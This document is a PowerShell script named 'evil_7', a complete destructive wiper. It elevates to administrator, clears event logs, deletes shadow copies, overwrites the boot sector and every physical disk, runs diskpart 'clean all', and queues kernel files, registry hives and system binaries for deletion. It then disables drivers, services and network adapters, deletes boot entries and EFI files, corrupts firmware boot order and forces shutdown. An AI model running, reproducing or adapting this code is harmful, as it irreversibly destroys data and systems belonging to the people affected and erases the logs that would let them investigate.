# evil_7

param([Switch]$Force)
if (-NOT $Force) { exit }
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" -Verb RunAs
    exit
}

function Set-PendingDelete {
    param($Path)
    if (Test-Path $Path) { reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\??\$Path\0\0" /f 2>$null }
}

function Stop-CriticalDriver {
    param($Driver)
    sc config "$Driver" start= disabled 2>$null
    Set-PendingDelete "C:\Windows\System32\drivers\$Driver.sys"
}

wevtutil cl System 2>$null; wevtutil cl Security 2>$null; wevtutil cl Application 2>$null; wevtutil cl Setup 2>$null
vssadmin delete shadows /all /quiet 2>$null
Get-WmiObject -Class Win32_ShadowCopy | ForEach-Object { $_.Delete() }

Get-NetAdapter -IncludeHidden | Where-Object { $_.Name -match "Bluetooth|Mobile|Cellular|WWAN" } | ForEach-Object {
    Disable-NetAdapter -Name $_.Name -Confirm:$false -Force -EA 0
}

$kernelFiles = @(
    "C:\Windows\System32\ntoskrnl.exe","C:\Windows\System32\ntkrnlmp.exe",
    "C:\Windows\System32\winload.exe","C:\Windows\System32\winload.efi",
    "C:\Windows\System32\winresume.exe","C:\Windows\System32\hal.dll"
)
foreach ($file in $kernelFiles) { Set-PendingDelete $file }

$regHives = @("SYSTEM","SOFTWARE","SAM","SECURITY","DEFAULT")
foreach ($hive in $regHives) {
    $target = "C:\Windows\System32\config\$hive"
    try { $null = [IO.File]::WriteAllBytes($target, [byte[]]::new(10MB)) } catch { Set-PendingDelete $target }
}

try { $null = [IO.File]::WriteAllBytes("\\.\PhysicalDrive0", [byte[]]::new(512)) } catch {}

Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA 0 | ForEach-Object {
    $name = $_.PSChildName
    if ($name -notmatch "WmiApSrv|Winmgmt|PowerShell|RpcSs|DcomLaunch|PlugPlay") {
        Set-ItemProperty -Path $_.PSPath -Name Start -Value 4 -EA 0
    }
}

$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","ntfs","refs","tcpip","ndis","mrxsmb","USBSTOR","USBHUB3","USBXHCI","bthport")
foreach ($d in $allDrivers) { Stop-CriticalDriver $d }

$disks = Get-WmiObject Win32_DiskDrive -EA 0
$patterns = @(0x00,0xFF,0x00,0xFF,0x00,0xFF,0xAA,0x92,0x49,0x24,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF)
foreach ($disk in $disks) {
    try {
        $size = [long]$disk.Size; if ($size -le 0) { continue }
        $path = "\\.\PhysicalDrive$($disk.Index)"; $fs = [IO.File]::OpenWrite($path); $block = New-Object byte[] (10MB)
        foreach ($pattern in $patterns) {
            for ($i=0;$i -lt $block.Length;$i++) { $block[$i]=$pattern }
            $total = [math]::Ceiling($size/10MB)
            for ($i=0;$i -lt $total -and $i -lt 50000;$i++) {
                $fs.Write($block,0,$block.Length)
                if ($i%100 -eq 0) { $fs.Flush() }
            }
        }
        $fs.Close()
    } catch {}
}

$diskpartScript = ($disks | ForEach-Object { "select disk $($_.Index)`nclean all`n" }) + "exit"
$diskpartScript | Out-File "$env:USERPROFILE\diskpart.txt" -Force
Start-Process diskpart.exe -Wait -NoNewWindow -ArgumentList "/s `"$env:USERPROFILE\diskpart.txt`"" -EA 0

Get-PSDrive -PSProvider FileSystem -EA 0 | ForEach-Object {
    $root = $_.Root.Replace("\","")
    if ($root -match "^[A-Z]$") {
        try { $raw="\\.\$root`:"; $fs=[IO.File]::OpenWrite($raw); $zero=New-Object byte[] (100MB); for($i=0;$i -lt 500;$i++){ $fs.Write($zero,0,$zero.Length); if($i%10 -eq 0){$fs.Flush()} }; $fs.Close() } catch {}
    }
}

$targets = @(
    "C:\Windows\System32\*.dll","C:\Windows\System32\*.exe","C:\Windows\System32\drivers\*.sys",
    "C:\Windows\SysWOW64\*.dll","C:\Windows\SysWOW64\*.exe",
    "C:\Program Files\*.dll","C:\Program Files\*.exe",
    "C:\Program Files (x86)\*.dll","C:\Program Files (x86)\*.exe",
    "C:\Windows\System32\*.mui","C:\Windows\Fonts\*","C:\Windows\Media\*",
    "C:\Windows\Resources\Themes\*"
)
foreach ($pattern in $targets) { Get-ChildItem $pattern -Recurse -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName } }

bcdedit /delete {bootmgr} /f 2>$null; bcdedit /delete {default} /f 2>$null; bcdedit /delete {current} /f 2>$null
try { mountvol Z: /s } catch {}
if (Test-Path "Z:\") { Remove-Item "Z:\EFI\*" -Recurse -Force -EA 0; mountvol Z: /d }
try { Set-FirmwareEnvironmentVariable -Name "BootOrder" -Namespace "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}" -Value ([byte[]]@(0xFF,0xFF,0xFF,0xFF)) -EA 0 } catch {}

Get-NetAdapter | Where-Object { $_.Name -ne "Loopback" } | ForEach-Object { Disable-NetAdapter -Name $_.Name -Confirm:$false -Force -EA 0 }
netsh wlan delete profile * 2>$null
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound 2>$null

Write-Host @"
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
"@ -ForegroundColor Red

1..3 | ForEach-Object { [Console]::Beep(666,500); Start-Sleep -Milliseconds 200; [Console]::Beep(1000,500); Start-Sleep -Milliseconds 200 }

Set-PendingDelete $PSCommandPath
Stop-Computer -Force

